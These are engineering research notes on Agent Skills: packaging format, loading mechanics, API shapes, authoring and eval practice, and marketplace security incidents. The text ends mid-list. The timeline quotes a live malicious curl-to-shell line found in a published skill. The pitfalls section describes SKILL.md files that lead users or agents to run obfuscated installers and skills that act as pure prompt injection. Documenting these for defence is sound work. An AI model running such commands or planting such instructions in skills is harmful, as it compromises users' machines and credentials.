# 06. Agent Skills — Engineering Practice notes

Lens: engineering practice (recipes, patterns, decision rules, measured results, production shape).
Scope boundary: Skills as a packaging format for procedural knowledge, discovery/loading mechanics,
the open standard, skills-vs-{MCP,subagents,slash commands,CLAUDE.md/AGENTS.md}, writing/evaluating
skills, distribution, security, limits, real examples. MCP protocol internals → ch05. Subagent
orchestration internals → ch12/13. Prompt-optimization technique itself → ch04.

## TL;DR (what an engineer must know today, 2026-09-30)

- A Skill = a directory with a required `SKILL.md` (YAML frontmatter + Markdown body) plus optional
  `scripts/`, `references/`, `assets/`. Only `name` and `description` are required by the open spec [S7].
- Loading is **progressive disclosure** in (at least) 3 levels: metadata (~100 tok, always in system
  prompt) → full `SKILL.md` body (<5k tok recommended, loaded when triggered) → bundled files/scripts
  (loaded/executed on demand, ~0 tokens until touched) [S7][S18].
- Anthropic announced Skills 2025-10-16 [S1][S3]; published it as an **open standard**
  (agentskills.io) 2025-12-18 [S3]. By 2026-09-30 the client showcase lists 40+ adopters including
  ChatGPT/Codex, Cursor, Gemini CLI, VS Code/GitHub Copilot, OpenCode, OpenHands, Goose, Letta,
  Roo Code, Amp, JetBrains Junie, Databricks, Snowflake, Spring AI, Laravel Boost, OpenClaw [S6].
- Claude Code merged **custom slash commands into skills**: a `.claude/commands/foo.md` file and a
  `.claude/skills/foo/SKILL.md` both produce `/foo` and work the same way; the old format still works
  but skills add a resource directory, invocation-control frontmatter, and auto-triggering [S5].
- "Skills replace MCP" is **not accurate as stated**. The honest framing (Anthropic, Willison, and
  independent practitioners agree): MCP is a live connectivity layer to external systems; skills are
  a packaging format for procedural knowledge, and they explicitly reference MCP tools by
  `ServerName:tool_name` inside their instructions [S1][S2][S11][S16]. What *is* true: many things
  people built as MCP servers to teach an agent "how to use tool X" are cheaper as a skill wrapping a
  CLI/SDK the agent already has bash access to — a GitHub MCP server's tool schemas cost "tens of
  thousands of tokens" up front vs "dozens of tokens" for a skill's metadata, per Willison [S2].
- Skills only work in a **filesystem + code-execution** environment — no such environment, no skills.
  This is why they're "entirely dependent on a coding environment" [S2][S9].
- The single most emphasized craft skill for authors: write the `description` field so Claude can
  discover the skill among 100+ others. Anthropic's own `skill-creator` skill tells authors Claude
  currently tends to **undertrigger** skills, and to write descriptions "a little bit pushy" [S24].
- Degrees-of-freedom framework for skill body content: low freedom (exact script, no params) for
  fragile/must-be-exact operations, high freedom (text heuristics) for open-ended judgment calls,
  medium in between [S11].
- Keep `SKILL.md` under 500 lines; keep file references one level deep from `SKILL.md`; give long
  reference files a table of contents — because Claude does partial reads (`head -100`) on nested
  references and can miss content [S5][S7][S11][S18].
- Security is not theoretical: a documented 2026-02 ClawHub campaign shipped macOS infostealer
  malware through "hundreds" of OpenClaw skills whose SKILL.md instructed users to run obfuscated
  install commands [S8]; a 2026-04 independent scan of 2,354 ClawHub skills found signature-based
  antivirus (VirusTotal) caught essentially none of it (0.04% "malicious") while LLM-based behavioral
  review flagged 4.4% as malicious and 86% as merely bad-practice ("vulnerable") [S13].
- Anthropic's Enterprise tier has an actual scanning feature (Skill content scanning in claude.ai/
  Cowork only — **not** covered for API uploads) [S19]; there is no equivalent for Claude Code's
  filesystem-based personal/project skills except manual review or third-party tools like Socket's
  scanner for skills.sh [S17].
- Evals for skills are now a real workflow, not folklore: Anthropic's `skill-creator` plugin runs
  isolated per-test-case subagents, grades against assertions, benchmarks with-skill vs without-skill
  (pass rate, tokens, time), does blind A/B between skill versions, and auto-tunes descriptions by
  generating should/should-not-trigger prompts [S5][S12].

## Current state and versions (as of 2026-09-30)

- **Anthropic / Claude**: Skills ship across Claude.ai (Pro/Max/Team/Enterprise), Claude Code, the
  Claude Agent SDK, and the Claude Developer Platform (API) [S1][S3]. The API path requires the
  `code_execution_20250825` tool and the `container.skills[]` parameter, max 20 skills per request
  [S10][S19]. Pre-built Anthropic skills: `pptx`, `xlsx`, `docx`, `pdf` [S10][S18].
- **Claude Code**: documented at code.claude.com/docs/en/skills, describing behavior through at
  least v2.1.28x. Skills load from enterprise/personal/project/nested/plugin locations, sync from a
  claude.ai account into `~/.claude/skills/synced/`, and support Claude-Code-only frontmatter
  extensions (`context: fork`, `disable-model-invocation`, `allowed-tools`, `hooks`, `paths`, `model`,
  `effort`, `shell`, `arguments`, dynamic `` !`cmd` `` injection) on top of the six spec-portable
  fields [S5].
- **Open standard**: agentskills.io, "originally developed by Anthropic, released as an open standard
  ... adopted by a growing number of agent products," open to ecosystem contribution via GitHub
  (`agentskills/agentskills`) and Discord [S6]. The formal spec document now lives only at
  agentskills.io/specification — the copy that used to be in `anthropics/skills/spec/` is a stub
  pointing there [S6][S7] (fetched 2026-09-30, `curl` on `raw.githubusercontent.com/anthropics/
  skills/main/spec/agent-skills-spec.md`).
- **skill-creator plugin** (evals/benchmark/A-B/description-tuning tool) announced 2026-03-03,
  installable via `/plugin install skill-creator@claude-plugins-official` [S12][S5].
- **Ecosystem scale**: skills.sh's own dashboard reports 3,884 skills, 1,079 publishers, 1,188 repos,
  170.4M cumulative installs as of 2026-09-30 [S22]. Socket.dev's 2026-02-17 post about adding
  scanning to skills.sh instead states "over 60,000 unique skills" across "Cursor, Claude Code,
  GitHub Copilot, Windsurf" [S17] — the two numbers disagree by an order of magnitude; likely
  different counting scope (registry-wide vs one dashboard's crawl), not reconciled in sources found.

## Timeline

- **2025-10-16**: Anthropic announces Agent Skills (`claude.com/blog/skills`, redirected from
  `anthropic.com/news/skills`) and publishes the engineering deep-dive "Equipping agents for the
  real world with Agent Skills" [S1][S3]. Same day, Simon Willison publishes "Claude Skills are
  awesome, maybe a bigger deal than MCP" [S2].
- **2025-10-20**: Tom MacWright publishes a first-run report hitting two concrete bugs in
  Claude-generated skills (wrong file path `.claude/skills/ast-grep.md` instead of
  `.claude/skills/ast-grep/SKILL.md`; missing YAML frontmatter) and raises the cross-environment
  dependency-availability problem [S9].
- **2025-12-04**: Jordan Rubin publishes an informal practitioner benchmark of "cognitive-operation"
  skills (dimensionalize, antithesize, excavate, rhyme, metaphorize), claiming +0.2–0.4 (0–1 scale)
  on insight/alignment/visibility/actionability vs. naive prompting across "dozens" of tested skills,
  with equal factual accuracy [S15].
- **2025-12-18**: Anthropic publishes Agent Skills as an **open standard** for cross-platform
  portability [S3].
- **2026-02-02**: 1Password documents the ClawHub malware campaign: a "Twitter" skill on OpenClaw's
  marketplace instructs users to install a fake `openclaw-core` prerequisite, running obfuscated
  commands that fetch a macOS infostealer and strip the Gatekeeper quarantine attribute; researcher
  Jason Meller found it by noticing the odd prerequisite [S8].
- **2026-02-17**: Socket.dev adds supply-chain scanning to skills.sh, citing a live example
  (`os.system("curl -s http://54.91.154.110:13338/ | sh")` in a Polymarket skill) and reporting
  94.5%/98.7%/96.7% precision/recall/F1 against a labeled set of 382 malicious + 355 popular benign
  skills [S17].
- **2026-03-03**: Anthropic announces the `skill-creator` plugin's eval/benchmark/comparator/
  description-tuning features [S12].
- **2026-04 (Trent AI post)**: Independent security analysis of 2,354 ClawHub skills using both
  VirusTotal and LLM-based behavioral review against MITRE ATLAS / OWASP Agentic AI Top 10; finds
  the two detection approaches disagree 89.5% of the time [S13].
- **2026-06-17 to 19**: Manifold Security privately discloses, and ClawHub removes, 23 plugins that
  squatted the official `@openclaw`/`@clawhub` namespaces (published 2026-03-26 through 2026-05-03);
  ClawHub adds a namespace-dispute process afterward [S14].
- **2026-09-30 (today)**: skills.sh dashboard snapshot used for this research: 3,884 skills / 1,079
  publishers / 1,188 repos / 170.4M installs [S22].

## Mechanics

### Anatomy of a skill (verbatim from the open spec) [S7]

```
skill-name/
├── SKILL.md          # Required: metadata + instructions
├── scripts/          # Optional: executable code
├── references/       # Optional: documentation
├── assets/           # Optional: templates, resources
└── ...               # Any additional files or directories
```

Minimal `SKILL.md`, VERBATIM [S7]:

```markdown
---
name: skill-name
description: A description of what this skill does and when to use it.
---
```

Frontmatter fields defined by the **open spec** (agentskills.io), VERBATIM table content [S7]:

| Field | Required | Constraints |
|---|---|---|
| `name` | Yes | Max 64 chars; lowercase unicode alphanumeric + hyphens; no leading/trailing/consecutive hyphens; must match the parent directory name |
| `description` | Yes | Max 1024 chars, non-empty |
| `license` | No | License name or reference to bundled license file |
| `compatibility` | No | Max 500 chars; environment requirements |
| `metadata` | No | Arbitrary string→string map |
| `allowed-tools` | No | Space-separated pre-approved tools; **Experimental** |

Claude API additionally bans the reserved words "anthropic" and "claude" in `name`, and bans XML
tags in both `name` and `description` [S10][S18] — these are Claude-specific validation rules layered
on top of the open spec, not part of the spec itself.

### Progressive disclosure — the exact numbers Anthropic gives [S7][S18]

| Level | When loaded | Token cost | Content |
|---|---|---|---|
| 1: Metadata | Always, at startup | ~100 tokens/skill | `name` + `description` |
| 2: Instructions | When skill triggers | <5,000 tokens recommended | `SKILL.md` body |
| 3+: Resources | As needed | 0 until accessed | `scripts/`, `references/`, `assets/` |

Mechanically: Claude runs in a VM with bash + filesystem access. At startup the system prompt
contains every installed skill's `name`+`description`. When a request matches one, Claude issues a
bash `cat`/`Read` on that skill's `SKILL.md`, and *that text enters the context window at that point*
— not before. If the body references `FORMS.md` or runs `scripts/fill_form.py`, those only cost
tokens when actually read (full file) or executed (only the script's **stdout**, never its source,
enters context) [S18]. This is the core trick: bundled content is "effectively unbounded" because
disk space is free and context is not [S1].

### Discovery → activation → execution, official 3-step framing [S6]

1. **Discovery**: at startup, agents load only name+description of each available skill.
2. **Activation**: when a task matches a skill's description, the agent reads the full `SKILL.md`.
3. **Execution**: the agent follows the instructions, optionally executing bundled code or loading
   referenced files as needed.

### Claude Code-specific mechanics not in the open spec [S5]

- **Locations and precedence**: enterprise (`managed settings dir`) > personal (`~/.claude/skills/`)
  > project (`.claude/skills/`) when names collide; a project skill silently replaces a bundled skill
  of the same name (but not its alias); nested `.claude/skills/` in a monorepo subdirectory loads
  lazily, only once Claude touches a file there, and both the root and nested skill stay addressable
  (`/deploy` vs `/apps/web:deploy`).
- **claude.ai sync**: in a signed-in terminal session, Claude Code downloads the account's enabled
  skills into `~/.claude/skills/synced/` in the background and polls for changes roughly every 10
  minutes; it never uploads local edits back, and a synced skill's shell-injection (`` !`cmd` ``)
  lines never execute locally regardless of settings.
- **Invocation control** — two independent booleans:
  - `disable-model-invocation: true` → only the human can run it (`/deploy`, `/commit`); Claude is
    blocked even if it "wants to," and is told not to reproduce the steps manually.
  - `user-invocable: false` → only Claude can run it; hidden from the `/` menu (background knowledge
    like "how our legacy system works").
- **`context: fork`**: runs the skill body as the entire prompt to a **new subagent** (not a fork of
  the current conversation — a common misconception the docs explicitly warn about), background by
  default, `agent:` picks the subagent type (built-in `Explore`/`Plan`/`general-purpose` or a custom
  one). This is the actual mechanism connecting skills to subagents (ch12/13 territory).
- **Skill content lifecycle**: once invoked, the rendered body stays in context across turns (Claude
  Code does not re-read the file each turn). On auto-compaction, Claude Code re-attaches only the
  **most recent invocation of each skill**, keeps the **first 5,000 tokens** of each, inside a
  **shared 25,000-token budget** across all re-attached skills — older/less-recent skills can be
  dropped entirely.
- **Skill listing budget**: the always-loaded name+description listing is capped at ~1% of the
  model's context window by default (`skillListingBudgetFraction`); when it overflows, Claude Code
  drops descriptions starting with your **least-invoked** skills, and each entry's own combined
  `description`+`when_to_use` text is separately capped at 1,536 characters.
- **`/skill-doctor`**: reports per-skill context cost and invocation frequency so you can prune.
- **Portability boundary**: Claude Code accepts *all* the extension fields above, but if you package
  a skill for claude.ai upload, the Skills API, or `package_skill.py`, only six fields survive:
  `name`, `description`, `license`, `compatibility`, `metadata`, `allowed-tools` — anything else is a
  **hard error**: `Unexpected key(s) in SKILL.md frontmatter: argument-hint. Allowed properties are:
  allowed-tools, compatibility, description, license, metadata, name` (VERBATIM error text) [S5].

### Skills API wire shapes

Create a custom skill, VERBATIM curl [S10]:

```bash
curl -X POST "https://api.anthropic.com/v1/skills" \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "anthropic-version: 2023-06-01" \
  -F "files[]=@financial_skill/SKILL.md;filename=financial_skill/SKILL.md" \
  -F "files[]=@financial_skill/analyze.py;filename=financial_skill/analyze.py"
```

Response, VERBATIM shape [S10]:

```json
{
  "id": "skill_01AbCdEfGhIjKlMnOpQrStUv",
  "display_name": "Financial Analysis Skill",
  "source": { "type": "custom" },
  "latest_version_id": "skver_01AbCdEfGhIjKlMnOpQrStUv",
  "created_at": "2025-01-15T12:00:00Z"
}
```

Using skills in a Messages request via the `container` parameter, VERBATIM [S10]:

```json
{
  "model": "claude-opus-5-5",
  "max_tokens": 4096,
  "container": {
    "skills": [
      { "type": "anthropic", "skill_id": "xlsx", "version": "latest" },
      { "type": "custom", "skill_id": "skill_01AbCdEfGhIjKlMnOpQrStUv", "version": "latest" }
    ]
  },
  "messages": [{ "role": "user", "content": "Create an Excel file with analysis" }],
  "tools": [{ "type": "code_execution_20250825", "name": "code_execution" }]
}
```

Notes: max **20 skills per request**; upload payload **<30MB uncompressed**; custom skills are
**workspace-scoped**, not per-end-user — for multi-tenant apps, use separate workspaces [S10]. Long
operations return `stop_reason: "pause_turn"` with a `container.id` + `expires_at` to resume against
the same container [S10]. New versions are full snapshots, not deltas — an omitted file is dropped,
not carried over [S10].

Runtime constraints differ sharply by surface [S18]:

| Surface | Network | Package install |
|---|---|---|
| claude.ai | Full/partial/none, admin-controlled | — |
| Claude API | **None** | **None** — pre-installed packages only |
| Claude Code | Full (same as any local program) | Allowed, but "should only install packages locally" |

This exact mismatch is what MacWright hit in October 2025 — remote/API execution is "a minimal
environment with Python, a few packages" with no ability to install dependencies, while local
Claude Code execution can touch any system binary [S9].

### Skills vs. MCP vs. subagents vs. slash commands vs. CLAUDE.md/AGENTS.md

- **Skills vs. MCP** — the cleanest practitioner framing found: *"Skills: things your agent knows how
  to do. MCP: things your agent can access"* [S16]. Skills package **procedural knowledge** (how);
  MCP provides **live, authenticated connections** to external systems (what). A skill's own docs
  instruct authors to reference MCP tools with fully-qualified `ServerName:tool_name` names inside
  the skill body — treating MCP as a dependency a skill can call, not a competitor [S11]. Anthropic's
  own framing in the launch post: skills "may work alongside MCP servers," teaching agents "more
  complex workflows that involve external tools and software" [S1]. Willison's sharper, more
  provocative claim, which is the actual source of the "bigger than MCP" meme: for anything an agent
  can already do via bash + an existing CLI/library, wrapping it in a **skill costs "dozens of
  tokens" up front vs a full MCP server's tool-schema overhead**, which he measured at "tens of
  thousands of tokens" for the GitHub MCP server [S2]. That is a real token-economy argument for
  *not* building an MCP server for things scriptable in a sandbox — but it does not extend to genuine
  external system access requiring auth/network from an environment without shell access (e.g. the
  Claude API's no-network sandbox), where MCP (or a hosted API integration) remains necessary.
- **Skills vs. subagents**: orthogonal but compositional in Claude Code. A skill with `context: fork`
  *becomes* a subagent invocation (system prompt from the agent type, task = the skill body). A
  custom subagent can instead **preload** skills as reference material into its own startup context
  — the inverse direction [S5]. Neither replaces the other; skills are content, subagents are
  isolation/parallelism.
- **Skills vs. slash commands**: in Claude Code these have literally merged. `.claude/commands/x.md`
  (old) and `.claude/skills/x/SKILL.md` (new) both produce `/x`; skills additionally get a resource
  directory, `disable-model-invocation`/`user-invocable` control, and Claude-initiated auto-loading
  that a bare command file never had [S5].
- **Skills vs. CLAUDE.md/AGENTS.md**: CLAUDE.md content is **always** in context, every turn, whether
  relevant or not. A skill's body loads **only when used** [S5]. Anthropic's own guidance: move a
  CLAUDE.md section into a skill "when a section of CLAUDE.md has grown into a procedure rather than
  a fact" [S5] — i.e., facts/identity → CLAUDE.md, multi-step how-to → skill.

### Writing good skills — the concrete craft rules [S11][S24]

- **Concise is key**: "Claude is already very smart" — challenge every sentence with "does Claude
  really need this explanation?" A verbose PDF-extraction snippet with background prose costs ~150
  tokens vs. ~50 for the code-only version that assumes Claude already knows what a library is [S11].
- **Degrees of freedom** — match specificity to task fragility:
  - *High freedom* (prose heuristics): "multiple approaches are valid... decisions depend on
    context." Example: a 4-step code-review checklist with no fixed commands.
  - *Medium freedom* (parameterized template/pseudocode): "a preferred pattern exists... some
    variation is acceptable."
  - *Low freedom* (exact script, explicit "do not modify"): "operations are fragile and
    error-prone... consistency is critical." Example given: `python scripts/migrate.py --verify
    --backup` with "Do not modify the command or add additional flags" [S11].
  Analogy used by Anthropic: narrow bridge with cliffs → exact instructions; open field → general
  direction and trust [S11].
- **Test across model tiers** deliberately, because "what works perfectly for Opus might need more
  detail for Haiku" [S11] — this is a genuinely underappreciated point: a skill authored/tested only
  against the strongest model may silently fail when a cheaper model runs it (relevant to this
  repo's model-routing conventions).
- **Description discovery is everything**: "Claude uses [the description] to choose the right Skill
  from potentially 100+ available Skills" [S11]. Always third person ("Processes Excel files," never
  "I can help you..." or "You can use this to...") because the description is injected straight into
  the system prompt and point-of-view inconsistency hurts matching [S11].
- **Anthropic's own `skill-creator` skill reveals an internal finding not in the public docs**:
  *"currently Claude has a tendency to 'undertrigger' skills — to not use them when they'd be
  useful. To combat this, please make the skill descriptions a little bit 'pushy.'"* Its own
  before/after example: replace *"How to build a simple fast dashboard to display internal Anthropic
  data"* with *"...Make sure to use this skill whenever the user mentions dashboards, data
  visualization, internal metrics, or wants to display any kind of company data, even if they don't
  explicitly ask for a 'dashboard.'"* — VERBATIM, from `skills/skill-creator/SKILL.md` [S24].
- **Scripts should solve, not defer**: catch `FileNotFoundError`/`PermissionError` explicitly inside
  a bundled script rather than letting Claude improvise recovery; justify every constant ("voodoo
  constants," citing Ousterhout's law) — `REQUEST_TIMEOUT = 30  # HTTP requests typically complete
  within 30 seconds` vs. bare `TIMEOUT = 47  # Why 47?` [S11].
- **Plan-validate-execute** pattern for batch/destructive operations: analyze → write a structured
  plan file (e.g. `changes.json`) → validate the plan with a script → execute → verify — catches
  errors before they're applied, and gives Claude machine-checkable error messages to self-correct
  from [S11].
- **Avoid nested references** ("Keep file references one level deep from SKILL.md") because Claude
  may `head -100` a referenced-from-a-reference file instead of reading it whole, silently losing
  information [S11].
- **Avoid time-sensitive content** in the body ("If you're doing this before August 2025, use the
  old API...") — put deprecated info under a collapsed "old patterns" `<details>` block instead,
  since the current content will otherwise rot and mislead [S11].
- **Evals before documentation**: "Create evaluations BEFORE writing extensive documentation" — the
  suggested loop is baseline-without-skill → write 3+ evals targeting observed gaps → minimal
  instructions → iterate, not the reverse [S11][S19]. Anthropic's enterprise guidance requires the
  same 3–5-query eval suite per skill before production approval, covering should-trigger,
  should-not-trigger, and ambiguous cases, tested across Haiku/Sonnet/Opus [S19].
- **The "Claude A / Claude B" development loop**: use one Claude instance to *write* the skill
  (it understands the SKILL.md format natively — "you don't need special system prompts") and a
  fresh instance to *test* it, then bring specific failure observations back to the authoring
  instance rather than guessing [S11].

### Evals mechanics — `skill-creator` plugin [S5][S12]

- Test cases live in `evals/evals.json` inside the skill directory (prompt + input files + expected
  behavior — see the JSON eval shape below).
- Each test case runs in an **isolated subagent** with a clean context; records token count and
  duration per run.
- `grading.json`: pass/fail + evidence per assertion.
- `benchmark.json`: aggregate pass rate / time / tokens **with-skill vs. without-skill**, so the
  token/time overhead can be weighed against the measured pass-rate gain.
- **Version comparison**: blind A/B judge between two versions of the same skill.
- **Description tuning**: auto-generates should-trigger / should-not-trigger prompts, measures hit
  rate, proposes description edits — reported result: "improved triggering on 5 of 6 public
  [document-creation] skills" [S12] (small sample, not a rigorous benchmark, but the only concrete
  before/after number found for this mechanism).
- **Review viewer**: HTML report for human qualitative feedback that feeds the next iteration.

Eval JSON shape, VERBATIM [S11]:

```json
{
  "skills": ["pdf-processing"],
  "query": "Extract all text from this PDF file and save it to output.txt",
  "files": ["test-files/document.pdf"],
  "expected_behavior": [
    "Successfully reads the PDF file using an appropriate PDF processing library or command-line tool",
    "Extracts text content from all pages in the document without missing any pages",
    "Saves the extracted text to a file named output.txt in a clear, readable format"
  ]
}
```

Note the doc's own caveat: *"There is not currently a built-in way to run these evaluations. Users
can create their own evaluation system"* [S11] — i.e. the JSON shape is a convention, not a shipped
runner, outside of the Claude-Code-specific `skill-creator` plugin and `claude plugin eval` (which
uses a *different*, non-interchangeable format for plugin-packaged skills) [S5].

## Numbers

| Measurement | Value | Conditions / who measured | Source |
|---|---|---|---|
| Metadata cost per skill | ~100 tokens | Always loaded at startup | Anthropic docs [S7][S18] |
| Recommended `SKILL.md` body size | <5,000 tokens / <500 lines | "for optimal performance" | Anthropic docs [S7][S11][S18] |
| Skill re-attach after compaction | first 5,000 tok/skill, 25,000 tok shared budget | Claude Code only | Claude Code docs [S5] |
| Skill listing budget | ~1% of model context window (default) | Claude Code, configurable | Claude Code docs [S5] |
| Description+when_to_use cap | 1,536 characters | Claude Code listing | Claude Code docs [S5] |
| Open-spec `description` cap | 1,024 characters | agentskills.io spec | [S7] |
| Max skills per API request | 20 | Claude API `container.skills[]` | [S10][S19] |
| Skill upload size | <30 MB uncompressed | Skills API | [S10] |
| MCP tool-schema overhead (GitHub MCP) | "tens of thousands of tokens" | Simon Willison, 2025-10-16, informal | [S2] |
| Skill metadata overhead per skill | "dozens of tokens" | Simon Willison, 2025-10-16, informal | [S2] |
| ClawHub scan (Trent AI, n=2,354): behavioral verdicts | Benign 9.6%, Vulnerable 86.0%, Malicious 4.4% | LLM review vs MITRE ATLAS/OWASP Agentic AI Top 10, April 2026 | [S13] |
| ClawHub scan: VirusTotal verdicts (same 2,354) | Clean 42.6%, Suspicious 57.2%, Malicious 0.04% | Signature-based, April 2026 | [S13] |
| Tool disagreement rate | 89.5% | Behavioral vs signature verdict mismatch | [S13] |
| Avg. security findings per package | 5.5 | Across the 2,354 packages | [S13] |
| Malicious packages found | 103 of 2,354 (4.4%) | 6 attack-pattern categories | [S13] |
| Socket.dev scanner precision/recall/F1 | 94.5% / 98.7% / 96.7% | Tested on 382 malicious + 355 benign popular skills.sh skills, 2026-02-17 | [S17] |
| skills.sh scale (per Socket) | "over 60,000 unique skills" | Across Cursor/Claude Code/Copilot/Windsurf, 2026-02-17 | [S17] |
| skills.sh scale (per own dashboard) | 3,884 skills / 1,079 publishers / 1,188 repos / 170.4M installs | Snapshot 2026-09-30 | [S22] — **disagrees with S17 by ~15x; scope/methodology not reconciled** |
| Squatted namespace plugins | 23 (5 `@clawhub`, 18 `@openclaw`), 14 distinct unrelated owners | Manifold Security, disclosed 2026-06-17, removed 2026-06-19 | [S14] |
| Informal skill-vs-no-skill quality delta | +0.2–0.4 on 0–1 scale (insight/alignment/visibility/actionability) | Jordan Rubin, "dozens" of tested skills, 2025-12-04, self-reported/informal | [S15] |
| Description-tuning hit-rate improvement | 5 of 6 public skills improved | `skill-creator` announcement, 2026-03-03 | [S12] |

## Pitfalls, limits, criticism

- **Signature-based malware scanning is close to useless against skill-based attacks.** The Trent AI
  study is the sharpest evidence: VirusTotal flagged 0.04% of a set where independent behavioral
  review found 4.4% outright malicious and 86% carrying real security defects [S13]. A pure markdown
  prompt-injection skill with **zero executable code** was found acting as the entire attack vector —
  nothing for a file scanner to catch [S13]. Practical implication: don't rely on "it passed our AV
  scan" as a skill security gate.
- **"Documentation is the installer."** The ClawHub campaign worked purely because a skill's
  SKILL.md, read and acted on by a human or agent, can itself instruct running an arbitrary shell
  command — collapsing the usual distinction between "reading instructions" and "executing code"
  [S8]. This is structurally the same risk surface as any prompt-injection channel, but skills make
  it a *first-class, discoverable, marketplace-distributed* artifact.
- **Trust badges (namespace/scope) are not enforcement.** ClawHub *documented* a rule requiring scope
  ownership verification and did not actually enforce it; 23 plugins wore official `@openclaw`/
  `@clawhub` badges for 2+ months before disclosure, and 6 of them were separately flagged
  "suspicious" by the registry's own scanner yet still passed manual review [S14]. Lesson explicitly
  drawn by the researchers: *"Scopes, badges, and audits tell you what a plugin claims to be...
  [runtime monitoring] shows you what it actually does"* [S14].
- **Cross-surface fragmentation**: a skill uploaded to claude.ai, one uploaded via the Skills API,
  and one placed in `.claude/skills/` in Claude Code are **three separate stores that never sync**
  [S18]. An organization distributing one skill to all three surfaces must build its own sync
  process; there is no admin-level org-wide push for claude.ai custom skills at all (only Claude Code
  managed-settings and the workspace-scoped API support real org distribution) [S18][S19].
  Anthropic's own quote: *"claude.ai does not support centralized admin management or org-wide
  distribution of custom Skills"* [S18].
  - Skills you ship as source-available reference (Anthropic's own `docx`/`pdf`/`pptx`/`xlsx`) are
    explicitly *not* guaranteed to match the actual hosted behavior — "the implementations and
    behaviors you receive from Claude may differ from what is shown in these skills" [S4].
- **Too many skills degrades recall, with no published number.** Anthropic's enterprise guidance says
  only "limit the number of Skills loaded simultaneously to maintain reliable recall accuracy... stop
  adding when performance degrades" — you must build your own eval to find your own ceiling; no
  concrete threshold is published [S19]. Related, concretely measurable failure inside Claude Code:
  once the always-loaded description listing exceeds its character budget, **least-used skills lose
  their descriptions first**, silently making them undiscoverable by Claude even though they still
  appear by name [S5].
- **Silent frontmatter failures.** If the opening `---` is not the file's literal first line, Claude
  Code treats the whole file (markers included) as body text with no parsed metadata at all — no
  error, just a skill that only works via explicit `/name` invocation and never auto-triggers [S5].
- **Nested-reference under-reading.** Claude may `head -100` a file that is itself referenced from
  another referenced file, silently truncating what it "read" — the documented fix is a strict
  one-level-deep reference discipline from `SKILL.md` [S11].
- **MCP tool name collisions inside skill bodies.** Referencing a bare `tool_name` instead of
  `ServerName:tool_name` can make Claude fail to find the tool once more than one MCP server is
  active — an easy-to-miss integration bug specifically at the skills/MCP seam [S11].
- **Package/network availability is not a fixed guarantee** — a skill written and tested in Claude
  Code (full network, arbitrary package install) can silently fail when the same `SKILL.md` runs
  through the API (`code_execution_20250825` sandbox: **zero network access, zero runtime package
  installs**) [S9][S18].
- **Anthropic's own eval format has no built-in runner** outside Claude Code's `skill-creator`
  plugin and `claude plugin eval` — the JSON schema shown in the best-practices doc is a
  documentation convention, and the docs say so directly [S11].
- **"Skills replace MCP" overstates a real but narrower point.** It is true skills are dramatically
  cheaper than a bespoke MCP server for teaching an agent to drive a CLI/library it can already
  shell out to; it is not true for scenarios needing authenticated, live, sandboxed external access
  from an environment with no shell (the Claude API skills sandbox itself has *no network access* and
  therefore cannot substitute for what an MCP server or hosted tool call provides there) [S2][S18].

## What changed in the last 6 months (since ~2026-03-30)

- The eval/benchmark/A-B/description-tuning tooling around skills (the `skill-creator` plugin
  feature set) shipped 2026-03-03 — before that, "does my skill actually help" was purely manual
  before/after comparison [S12].
- Independent, large-sample security research on skill marketplaces matured: the Trent AI 2,354-skill
  study (April 2026) is the first quantified answer to "how much of this ecosystem is actually
  malicious vs. merely sloppy," and it directly contradicts naive "just run it through an AV scanner"
  advice [S13].
- Supply-chain trust mechanics (namespace/scope ownership) were shown to be documentation-only rather
  than enforced on at least one major marketplace, with a public disclosure-and-fix cycle completed
  within days once reported (2026-06-17 → 06-19) [S14].
- Third-party commercial security tooling entered the space specifically for skill/plugin
  marketplaces (Socket for skills.sh, Feb 2026 [S17]; multiple smaller scanners referenced on HN in
  this window — SkillScan, claw-bench, clawsec-monitor, agent-browser-shield — suggesting a small
  cottage industry of skill-security tools emerged in H1 2026, though these smaller tools were only
  discovered via HN search, not independently read in depth here).
- Adoption breadth widened materially: the agentskills.io client showcase (read 2026-09-30) already
  includes OpenAI's ChatGPT/Codex, Cursor, Gemini CLI, VS Code/GitHub Copilot, and dozens more —
  Willison's 2025-10-16 prediction of a "Cambrian explosion" is, per this evidence, realized within
  under a year [S2][S6].
- Claude Code's own feature surface around skills grew substantially past the original spec: forked
  subagent execution (`context: fork`), dynamic shell injection (`` !`cmd` ``), per-skill model/effort
  overrides, `/skill-doctor` usage analytics, and claude.ai account sync are all Claude-Code-only
  additions layered on top of the portable 6-field open spec, per the "Using skill frontmatter
  outside Claude Code" compatibility table [S5].

## Diagram candidates

1. **Progressive disclosure pyramid** — 3 tiers (Metadata ~100 tok always-on → SKILL.md body <5k tok
   on-trigger → bundled scripts/refs 0 tok until touched), arrows labeled "startup," "description
   match," "bash read / exec" [S7][S18].
2. **Discovery→activation→execution sequence** — actors: System Prompt, User, Claude, Filesystem
   (bash). Arrows: all descriptions preloaded → user message → Claude matches description → `bash cat
   SKILL.md` → body enters context → conditional `bash read reference.md` / `bash exec script.py` →
   only stdout enters context [S6][S18].
3. **Skill vs. MCP vs. subagent vs. slash-command vs. CLAUDE.md decision map** — 2-axis placement:
   "always-loaded vs. on-demand" × "local knowledge vs. external live access."
4. **Claude Code skill name-resolution precedence** — enterprise > personal > project, with the
   bundled-skill-override and plugin-namespacing special cases as branches [S5].
5. **Skill content lifecycle across compaction** — timeline: invoke (full body enters context) → N
   turns of persistence with no re-read → compaction event → re-attach latest invocation per skill
   (cap 5k tok) inside a 25k-tok shared pool → oldest-invoked skills dropped first [S5].
6. **Skills API request/response flow** — Client → `POST /v1/skills` (upload) → `skill_id` → Messages
   API call with `container.skills[]` + `code_execution` tool → sandboxed VM executes → `file_id` in
   response → `GET /v1/files/{id}/content` download [S10].
7. **ClawHub attack chain** — actors: Attacker, ClawHub listing, Victim's OpenClaw agent, macOS host.
   States: publish fake-prerequisite skill → user installs "top downloaded" → SKILL.md instructs
   installing "openclaw-core" → obfuscated command decodes → stage-2 payload fetched → Gatekeeper
   quarantine attribute stripped → credentials/tokens exfiltrated [S8].
8. **Scope-squatting timeline** — publish under unclaimed `@openclaw`/`@clawhub` scope (Mar–May 2026)
   → passes/partially-flagged by automated scanner → 2+ months live → Manifold private disclosure
   (Jun 17) → ClawHub removes + adds dispute process (Jun 19) [S14].
9. **Degrees-of-freedom dial** — Low (exact script, "do not modify") — Medium (parameterized
   template) — High (prose heuristics), mapped against "narrow bridge with cliffs" vs "open field"
   analogy [S11].
10. **skill-creator eval loop** — draft skill → write `evals/evals.json` → spawn isolated subagent per
